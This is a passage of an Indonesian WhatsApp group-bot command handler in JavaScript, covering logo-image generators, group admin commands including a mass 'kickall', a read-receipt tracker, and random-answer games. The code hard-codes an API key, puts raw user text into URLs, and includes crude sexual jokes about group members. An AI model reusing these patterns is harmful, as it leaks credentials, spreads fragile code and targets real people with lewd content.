			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.zeks.me/api/lithgtext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'glitch':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}glitch nama|autor`
			)
			g1 = q.split('|')[0]
			g2 = q.split('|')[1]
			g3 = q.split('|')[2]
			reply(mess.wait)
			glitch =
				await getBuffer(
					`https://api.zeks.me/api/retro?apikey=apivinz&text1=${g1}&text2=${g2}&text3=${g3}`
				)
			Maslent.sendMessage(
				from,
				glitch,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'asap':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			asap =
				await getBuffer(
					`https://api.zeks.me/api/smoketext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, asap,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'naruto':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			naruto =
				await getBuffer(
					`https://api.zeks.me/api/naruto?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from,
				naruto,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'breakwall':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			breakwall =
				await getBuffer(
					`https://api.zeks.me/api/breakwall?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from,
				breakwall,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'gneon':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			gneon =
				await getBuffer(
					`https://api.zeks.me/api/gneon?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, gneon,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'bunga':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			kembang =
				await getBuffer(
					`https://api.zeks.me/api/flowertext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from,
				kembang,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'silk':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			kaen =
				await getBuffer(
					`https://api.zeks.me/api/silktext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, kaen,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'glow':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
				)
			reply(mess.wait)
			tahta = args.join(
				" ")
			aser =
				await getBuffer(
					`https://api.zeks.me/api/glowtext?apikey=apivinz&text=${tahta}`
				)
			Maslent.sendMessage(
				from, aser,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'pubg':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
			)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			pbg =
				await getBuffer(
					`https://api.zeks.me/api/pubglogo?apikey=apivinz&text1=${m1}&text2=${m2}`
				)
			Maslent.sendMessage(
				from, pbg,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break
		case 'fflogo':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
			)
			m1 = q.split('|')[0]
			reply(mess.wait)
			eses =
				await getBuffer(
					`https://api.zeks.me/api/epep?apikey=apivinz&text1=${m1}`
				)
			Maslent.sendMessage(
				from, eses,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break

		case 'comenporno':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}porno nama|autor`
			)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			porno =
				await getBuffer(
					`https://api.zeks.me/api/phub?apikey=apivinz&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara+buat+foto+profil+di+whatsapp+menjadi+unik.jpg&text1=${m1}&text2=${m2}`
				)
			Maslent.sendMessage(
				from, porno,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
						)
				})
			break

		case 'promote':
			reply('🗿')
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined)
				return;
			if (mek.message
				.extendedTextMessage
				.contextInfo
				.participant ===
				undefined) {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (entah
					.length > 0
				) {
					var mems_ids = []
					for (let ids of
							entah) {
						mems_ids
							.push(
								ids
							)
					}
					Maslent
						.groupMakeAdmin(
							from,
							mems_ids
						)
				} else {
					Maslent
						.groupMakeAdmin(
							from,
							entah
						)
				}
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				Maslent
					.groupMakeAdmin(
						from, [
							entah
						])
			}
			break
		case 'demote':
			reply('🗿')
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined)
				return;
			if (mek.message
				.extendedTextMessage
				.contextInfo
				.participant ===
				undefined) {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (entah
					.length > 0
				) {
					var mems_ids = []
					for (let ids of
							entah) {
						mems_ids
							.push(
								ids
							)
					}
					Maslent
						.groupDemoteAdmin(
							from,
							mems_ids
						)
				} else {
					Maslent
						.groupDemoteAdmin(
							from,
							[entah[
								0
							]]
						)
				}
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				Maslent
					.groupDemoteAdmin(
						from, [
							entah
						])
			}
			break
		case 'setnamegc':
		case 'setgrupname':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
			) return
			if (args.length ==
				0) return reply(
				`Penggunaan ${prefix}setgrupname name`
			)
			Maslent
				.groupUpdateSubject(
					from, q)
				.then((res) =>
					reply(
						jsonformat(
							res)
					))
				.catch((err) =>
					reply(
						jsonformat(
							err)
					))
			break
		case 'setdesc':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)

			if (args.length ==
				0) return reply(
				`Penggunaan ${prefix}setdesc desc`
			)
			Maslent
				.groupUpdateDescription(
					from, q)
				.then((res) =>
					reply(
						jsonformat(
							res)
					))
				.catch((err) =>
					reply(
						jsonformat(
							err)
					))
			break
		case 'setppgroup':
		case 'setppgrup':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)

			if (isQuotedImage) {
				let encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
					)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				let media =
					await Maslent
					.downloadMediaMessage(
						encmedia
					)
				Maslent
					.updateProfilePicture(
						from,
						media)
					.then((
							res
						) =>
						reply(
							jsonformat(
								res
							)
						))
					.catch((
							err
						) =>
						reply(
							jsonformat(
								err
							)
						))
			} else {
				reply(
					`Kirim atau tag gambar dengan caption ${prefix}setppgrup`
				)
			}
			break
		case 'me':
		case 'profile':
			let Levelnye = level
				.getLevelingLevel(
					sender,
					_level)
			let Xpluu = level
				.getLevelingXp(
					sender,
					_level)
			let requiredXplu =
				10 * Math.pow(
					Levelnye, 2
				) + 50 *
				Levelnye + 100
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			try {
				profil =
					await Maslent
					.getProfilePicture(
						`${sender.split('@')[0]}@s.whatsapp.net`
					)
			} catch {
				profil =
					errorImg
			}
			thu = await Maslent
				.getStatus(
					`${sender.split('@')[0]}@s.whatsapp.net`,
					MessageType
					.text)
			me = Maslent.user
			uptime = process
				.uptime()
			profile =
				`-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
			buff =
				await getBuffer(
					profil)
			Maslent.sendMessage(
				from, buff,
				image, {
					quoted: freply,
					caption: profile
				})
			break
		case 'afk':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (isAfkOn)
				return reply(
					'Woe Kalo Mau Afk Jangan Nimbrung di sini'
				)
			const reason = q ?
				q : 'Nothing.'
			afk.addAfkUser(
				sender,
				time,
				reason, _afk
			)
			const aluty =
				`Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
			reply(aluty)
			break
		case 'infogrup':
		case 'grupinfo':
		case 'groupinfo':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			try {
				var pic =
					await Maslent
					.getProfilePicture(
						from)
			} catch {
				var pic =
					'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
			}
			let ingfo =
				`*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
			Maslent.sendMessage(
				from,
				await getBuffer(
					pic),
				image, {
					quoted: mek,
					caption: ingfo,
					contextInfo: {
						"mentionedJid": [
							groupMetadata
							.owner
							.replace(
								'@c.us',
								'@s.whatsapp.net'
							)
						]
					}
				})
			break
		case 'tagall':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)

			let arr = [];
			let txti =
				`*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
			for (let i of
					groupMembers) {
				txti +=
					`=> @${i.jid.split("@")[0]}\n`
				arr.push(i.jid)
			}
			mentions(txti, arr,
				true)
			break
		case 'kickall': // Anti Banned
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			for (let i of
					groupMembers) {
				await kickMember
					(from, [i
						.jid
					])
			}
			break
		case 'leave':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			setTimeout(() => {
				Maslent
					.groupLeave(
						from
					)
			}, 2000)
			setTimeout(() => {
				reply(
					'Byee...'
				)
			}, 0)
			break
		case 'online':
		case 'listonline':
		case 'here':
			if (!isGroup)
				return reply(
					`Only group`
				)
			try {
				let ido =
					args &&
					/\d+\-\d+@g.us/
					.test(args[
						0]) ?
					args[0] :
					from
				let online = [
					...
					Object
					.keys(
						Maslent
						.chats
						.get(
							ido
						)
						.presences
					),
					Maslent
					.user
					.jid
				]
				Maslent
					.sendMessage(
						from,
						'List Online:\n' +
						online
						.map(
							v =>
							'- @' +
							v
							.replace(
								/@.+/,
								''
							)
						)
						.join `\n`,
						text, {
							quoted: mek,
							contextInfo: {
								mentionedJid: online
							}
						})
			} catch (e) {
				reply(`${e}`)
			}
			break
		case 'hidetag':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			try {
				quotedText = mek
					.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.conversation
				hideTag(from,
					`${quotedText}`
				)
			} catch {
				hideTag(from,
					`${q}`)
			}
			break
		case 'sider':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			try {
				infom =
					await Maslent
					.messageInfo(
						from,
						mek
						.message
						.extendedTextMessage
						.contextInfo
						.stanzaId
					)
				tagg = []
				teks =
					`*• Dibaca oleh:*\n\n`
				for (let i of
						infom
						.reads) {
					teks +=
						'@' + i
						.jid
						.split(
							'@'
						)[
							0] +
						'\n'
					teks +=
						`> ` +
						moment(
							`${i.t}` *
							1000
						)
						.tz(
							'Asia/Jakarta'
						)
						.format(
							'DD/MM/YYYY HH:mm:ss'
						) +
						'\n\n'
					tagg.push(i
						.jid
					)
				}
				teks +=
					`*• Tersampaikan pada:*\n\n`
				for (let i of
						infom
						.deliveries) {
					teks +=
						'@' + i
						.jid
						.split(
							'@'
						)[
							0] +
						'\n'
					teks +=
						`> ` +
						moment(
							`${i.t}` *
							1000
						)
						.tz(
							'Asia/Jakarta'
						)
						.format(
							'DD/MM/YYYY HH:mm:ss'
						) +
						'\n\n'
					tagg.push(i
						.jid
					)
				}
				mentions(teks,
					tagg,
					true)
			} catch (e) {
				console.log(
					color(e)
				)
				reply(
					'Reply chat bot!'
				)
			}
			break
			//------------------< Fun >-------------------
		case 'public':
			if (!mek.key
				.fromMe && !
				isOwner)
				return reply(
					'Fitur Khusus Owner!!'
				)
			if (banChats ===
				false) return
			// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
			setting.banChats =
				false
			banChats = false
			fs.writeFileSync(
				'./setting.json',
				JSON
				.stringify(
					setting,
					null, 2)
			)
			reply(
				`「 *PUBLIC-MODE* 」`
			)
			break
		case 'self':
			if (!mek.key
				.fromMe && !
				isOwner)
				return reply(
					'Fitur Khusus Owner!!'
				)
			if (setting
				.banChats ===
				true) return
			setting.banChats =
				true
			uptime = process
				.uptime()
			// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
			banChats = true
			fs.writeFileSync(
				'./setting.json',
				JSON
				.stringify(
					setting,
					null, 2)
			)
			reply(
				`「 *SELF-MODE* 」`
			)
			break
		case 'wangy':
			if (!q) return
			qq = q.toUpperCase()
			awikwok =
				`${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
			reply(awikwok)
			break
		case 'mining':
			var mining =
				randomNomor(
					1000)
			atm.addKoinUser(
				sender,
				mining,
				_uang)
			await reply(
				`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`
			)
			break
		case 'waktu':
			reply(
				`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`
			)
			break
		case 'cekmati':
			if (!q) return reply(
				mess
				.wrongFormat
			)
			predea = await axios
				.get(
					`https://api.agify.io/?name=${q}`
				)
			reply(
				`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`
			)
			break
		case 'toxic':
			Toxic().then(
				toxic => {
					reply(
						toxic
					)
				})
			break
		case 'citacita':
			const cita = [
				'http://piyobot.000webhostapp.com/citacita1.mp3',
				'http://piyobot.000webhostapp.com/citacita2.mp3',
				'http://piyobot.000webhostapp.com/citacita3.mp3',
				'http://piyobot.000webhostapp.com/citacita4.mp3',
				'http://piyobot.000webhostapp.com/citacita5.mp3',
				'http://piyobot.000webhostapp.com/citacita6.mp3',
				'http://piyobot.000webhostapp.com/citacita7.mp3',
				'http://piyobot.000webhostapp.com/citacita8.mp3',
				'http://piyobot.000webhostapp.com/citacita9.mp3',
				'http://piyobot.000webhostapp.com/citacita10.mp3',
				'http://piyobot.000webhostapp.com/citacita11.mp3',
				'http://piyobot.000webhostapp.com/citacita12.mp3',
				'http://piyobot.000webhostapp.com/citacita13.mp3',
				'http://piyobot.000webhostapp.com/citacita14.mp3',
				'http://piyobot.000webhostapp.com/citacita15.mp3',
				'http://piyobot.000webhostapp.com/citacita16.mp3',
				'http://piyobot.000webhostapp.com/citacita17.mp3',
				'http://piyobot.000webhostapp.com/citacita18.mp3',
				'http://piyobot.000webhostapp.com/citacita19.mp3',
				'http://piyobot.000webhostapp.com/citacita20.mp3',
				'http://piyobot.000webhostapp.com/citacita21.mp3',
				'http://piyobot.000webhostapp.com/citacita22.mp3',
				'http://piyobot.000webhostapp.com/citacita23.mp3',
				'http://piyobot.000webhostapp.com/citacita24.mp3',
				'http://piyobot.000webhostapp.com/citacita25.mp3',
				'http://piyobot.000webhostapp.com/citacita26.mp3',
				'http://piyobot.000webhostapp.com/citacita27.mp3',
				'http://piyobot.000webhostapp.com/citacita28.mp3',
				'http://piyobot.000webhostapp.com/citacita29.mp3',
				'http://piyobot.000webhostapp.com/citacita30.mp3',
				'http://piyobot.000webhostapp.com/citacita31.mp3',
				'http://piyobot.000webhostapp.com/citacita32.mp3',
				'http://piyobot.000webhostapp.com/citacita33.mp3',
				'http://piyobot.000webhostapp.com/citacita34.mp3',
				'http://piyobot.000webhostapp.com/citacita35.mp3'
			]
			const cita3 = cita[
				Math.floor(
					Math
					.random() *
					cita
					.length)
			]
			cita2 =
				await getBuffer(
					cita3)
			Maslent.sendMessage(
				from, cita2,
				audio, {
					mimetype: 'audio/mp4',
					ptt: true,
					quoted: mek
				})
			break
		case 'apakah':
			apakah = body.slice(
				1)
			const apa = ['Iya',
				'Tidak',
				'Bisa Jadi',
				'Coba Ulangi'
			]
			const kah = apa[Math
				.floor(Math
					.random() *
					apa
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				apakah +
				'\n*Jawaban :* ' +
				kah, text, {
					quoted: mek
				})
			break
		case 'rate':
		case 'nilai':
			rate = body.slice(1)
			const ra = ['0',
				'4', '9',
				'17', '28',
				'34', '48',
				'59', '62',
				'74', '83',
				'97', '100',
				'29', '94',
				'75', '82',
				'41', '39'
			]
			const te = ra[Math
				.floor(Math
					.random() *
					ra
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				rate +
				'\n*Jawaban :* ' +
				te + '%',
				text, {
					quoted: mek
				})
			break
		case 'gantengcek':
		case 'cekganteng':
			ganteng = body
				.slice(1)
			const gan = ['10',
				'30', '20',
				'40', '50',
				'60', '70',
				'62', '74',
				'83', '97',
				'100', '29',
				'94', '75',
				'82', '41',
				'39'
			]
			const teng = gan[
				Math.floor(
					Math
					.random() *
					gan
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				ganteng +
				'\n*Jawaban :* ' +
				teng + '%',
				text, {
					quoted: mek
				})
			break
		case 'cantikcek':
		case 'cekcantik':
			cantik = body.slice(
				1)
			const can = ['10',
				'30', '20',
				'40', '50',
				'60', '70',
				'62', '74',
				'83', '97',
				'100', '29',
				'94', '75',
				'82', '41',
				'39'
			]
			const tik = can[Math
				.floor(Math
					.random() *
					can
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				cantik +
				'\n*Jawaban :* ' +
				tik + '%',
				text, {
					quoted: mek
				})
			break
		case 'cekwatak':
			var namao = pushname
			var prfx =
				await Maslent
				.getProfilePicture(
					sender)
			const watak = [
				'top deh pokoknya',
				'penyayang',
				'pemurah',
				'Pemarah',
				'Pemaaf',
				'Penurut',
				'Baik',
				'baperan',
				'Baik-Hati',
				'penyabar',
				'UwU',
				'Suka Membantu'
			]
			const wtk = watak[
				Math.floor(
					Math
					.random() *
					(watak
						.length
					))]
			const ratenyaasu = [
				'100%',
				'95%',
				'90%',
				'85%',
				'80%',
				'75%',
				'70%',
				'65%',
				'60%',
				'55%',
				'50%',
				'45%',
				'40%',
				'35%',
				'30%',
				'25%',
				'20%',
				'15%',
				'10%', '5%'
			]
			const akhlak =
				ratenyaasu[Math
					.floor(Math
						.random() *
						(ratenyaasu
							.length
						))]
			const sifat = [
				'Penolong',
				'Suka Membantu',
				'Saling Menolong',
				'Perhatian',
				'Ngak Cuek',
				'Romantis',
				'Dermawan',
				'Cool',
				'Peduli Kepada Sesama',
				'Suka Berkata Kasar'
			]
			const sft = sifat[
				Math.floor(
					Math
					.random() *
					(sifat
						.length
					))]
			const hobby = [
				'Memasak',
				'Membantu Atok',
				'Mabar',
				'Nobar',
				'Coli',
				'Colmek',
				'Sosmedtan',
				'Membantu Orang lain',
				'Nonton Anime',
				'Nonton Drakor',
				'Naik Motor',
				'Nyanyi',
				'Menari',
				'Bertumbuk',
				'Menggambar',
				'Foto fotoan Ga jelas',
				'Maen Game',
				'Berbicara Sendiri'
			]
			const hby = hobby[
				Math.floor(
					Math
					.random() *
					(hobby
						.length
					))]
			const kelebihan = [
				'Soleh dan Soleha',
				'Pintar',
				'Rajin',
				'Teladan'
			]
			const klbh =
				kelebihan[Math
					.floor(Math
						.random() *
						(kelebihan
							.length
						))]
			const tipe = [
				'cool',
				'idaman',
				'Alami',
				'Keren',
				'Ideal',
				'Dia Bamget',
				'normal',
				'elite',
				'epic',
				'Legend'
			]
			const typo = tipe[
				Math.floor(
					Math
					.random() *
					(tipe
						.length
					))]
			await reply(
				`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`
			)
			break
		case 'hobby':
			hobby = body.slice(
				1)
			const by = hobby[
				Math.floor(
					Math
					.random() *
					hobby
					.length)
			]
			Maslent.sendMessage(
				from,
				'Pertanyaan : *' +
				hobby +
				'*\n\nJawaban : ' +
				by, text, {
					quoted: mek
				})
			break
		case 'bisakah':
			bisakah = body
				.slice(1)
			const bisa = [
				'Bisa',
				'Tidak Bisa',
				'Coba Ulangi',
				'MANA GW TAU'
			]
			const keh = bisa[
				Math.floor(
					Math
					.random() *
					bisa
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				bisakah +
				'\n*Jawaban :* ' +
				keh, text, {
					quoted: mek
				})
			break
		case 'kapankah':
			kapankah = body
				.slice(1)
			const kapan = [
				'Besok',
				'Lusa',
				'Tadi',
				'4 Hari Lagi',
				'5 Hari Lagi',
				'6 Hari Lagi',
				'1 Minggu Lagi',
				'2 Minggu Lagi',
				'3 Minggu Lagi',
				'1 Bulan Lagi',
				'2 Bulan Lagi',
				'3 Bulan Lagi',
				'4 Bulan Lagi',
				'5 Bulan Lagi',
				'6 Bulan Lagi',
				'1 Tahun Lagi',
				'2 Tahun Lagi',
				'3 Tahun Lagi',
				'4 Tahun Lagi',
				'5 Tahun Lagi',
				'6 Tahun Lagi',
				'1 Abad lagi',
				'3 Hari Lagi'
			]
			const koh = kapan[
				Math.floor(
					Math
					.random() *
					kapan
					.length)
			]
			Maslent.sendMessage(
				from,
				'*Pertanyaan :* ' +
				kapankah +
				'\n*Jawaban :* ' +
				koh, text, {
					quoted: mek
				})
			break
		case 'truth':
			const trut = [
				'Pernah suka sama siapa aja? berapa lama?',
				'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)',
				'apa ketakutan terbesar kamu?',
				'pernah suka sama orang dan merasa orang itu suka sama kamu juga?',
				'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?',
				'pernah gak nyuri uang nyokap atau bokap? Alesanya?',
				'hal yang bikin seneng pas lu lagi sedih apa',
				'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?',
				'pernah jadi selingkuhan orang?',
				'hal yang paling ditakutin',
				'siapa orang yang paling berpengaruh kepada kehidupanmu',
				'hal membanggakan apa yang kamu dapatkan di tahun ini',
				'siapa orang yang bisa membuatmu sange',
				'siapa orang yang pernah buatmu sange',
				'(bgi yg muslim) pernah ga solat seharian?',
				'Siapa yang paling mendekati tipe pasangan idealmu di sini',
				'suka mabar(main bareng)sama siapa?',
				'pernah nolak orang? alasannya kenapa?',
				'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget',
				'pencapaian yang udah didapet apa aja ditahun ini?',
				'kebiasaan terburuk lo pas di sekolah apa?'
			]
			const ttrth = trut[
				Math.floor(
					Math
					.random() *
					trut
					.length)
			]
			truteh =
				await getBuffer(
					`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
				)
			Maslent.sendMessage(
				from,
				truteh,
				image, {
					caption: '*Truth*\n\n' +
						ttrth,
					quoted: mek
				})
			break
		case 'dare':
			const dare = [
				'Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu',
				'telfon crush/pacar sekarang dan ss ke pemain',
				'pap ke salah satu anggota grup',
				'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo',
				'ss recent call whatsapp',
				'drop emot "??💨" setiap ngetik di gc/pc selama 1 hari',
				'kirim voice note bilang can i call u baby?',
				'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu',
				'pake foto sule sampe 3 hari',
				'ketik pake bahasa daerah 24 jam',
				'ganti nama menjadi "gue anak lucinta luna" selama 5 jam',
				'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you',
				'prank chat mantan dan bilang " i love u, pgn balikan',
				'record voice baca surah al-kautsar',
				'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini',
				'sebutkan tipe pacar mu!',
				'snap/post foto pacar/crush',
				'teriak gajelas lalu kirim pake vn kesini',
				'pap mukamu lalu kirim ke salah satu temanmu',
				'kirim fotomu dengan caption, aku anak pungut',
				'teriak pake kata kasar sambil vn trus kirim kesini',
				'teriak " anjimm gabutt anjimmm " di depan rumah mu',
				'ganti nama jadi " BOWO " selama 24 jam',
				'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll'
			]
			const der = dare[
				Math.floor(
					Math
					.random() *
					dare
					.length)
			]
			buffer =
				await getBuffer(
					`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
				)
			Maslent.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: '*Dare*\n\n' +
						der
				})
			break
		case 'jadian':
			jds = []
			jdii = groupMembers
			koss = groupMembers
			akuu = jdii[Math
				.floor(Math
					.random() *
					jdii
					.length)
			]
			diaa = koss[Math
				.floor(Math
					.random() *
					koss
					.length)
			]
			teks =
				`Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
			jds.push(akuu.jid)
			jds.push(diaa.jid)
			mentions(teks, jds,
				true)
			break
		case 'cantik':
			membr = []
			const mes =
				groupMembers
			const msk =
				groupMembers
			const siaps = mes[
				Math.floor(
					Math
					.random() *
					mes
					.length)
			]
			const sips =
				pushname[Math
					.floor(Math
						.random() *
						msk
						.length)
				]
			teks =
				`*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
			membr.push(siaps
				.jid)
			mentions(teks,
				membr, true)
			break
		case 'ganteng':
			membr = []
			const nus =
				groupMembers
			const msl =
